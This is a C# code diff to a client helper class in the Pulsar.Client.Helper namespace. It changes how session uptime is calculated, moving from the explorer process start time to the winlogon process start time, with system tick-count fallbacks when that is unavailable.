@@ -2,6 +2,7 @@
 using Pulsar.Common.Helpers;
 using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Management;
 
 namespace Pulsar.Client.Helper
@@ -12,23 +13,24 @@ namespace Pulsar.Client.Helper
         {
             try
             {
-                var explorer = System.Diagnostics.Process.GetProcessesByName("explorer");
-                if (explorer.Length > 0)
-                {
-                    DateTime sessionStart = explorer[0].StartTime;
-                    TimeSpan uptimeSpan = DateTime.Now - sessionStart;
+                var proc = System.Diagnostics.Process.GetProcessesByName("winlogon").FirstOrDefault();
+                DateTime sessionStart;
 
-                    return string.Format("{0}d : {1}h : {2}m : {3}s",
-                        uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
-                }
+                if (proc != null)
+                    sessionStart = proc.StartTime;
                 else
-                {
-                    return "Explorer not running";
-                }
+                    // Fallback to system uptime
+                    sessionStart = DateTime.Now - TimeSpan.FromMilliseconds(Environment.TickCount);
+
+                TimeSpan uptimeSpan = DateTime.Now - sessionStart;
+
+                return $"{uptimeSpan.Days}d : {uptimeSpan.Hours}h : {uptimeSpan.Minutes}m : {uptimeSpan.Seconds}s";
             }
             catch
             {
-                return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
+                // Fallback again if access denied or process info unavailable
+                TimeSpan uptimeSpan = TimeSpan.FromMilliseconds(Environment.TickCount);
+                return $"{uptimeSpan.Days}d : {uptimeSpan.Hours}h : {uptimeSpan.Minutes}m : {uptimeSpan.Seconds}s";
             }
         }
         public static string GetPcName()
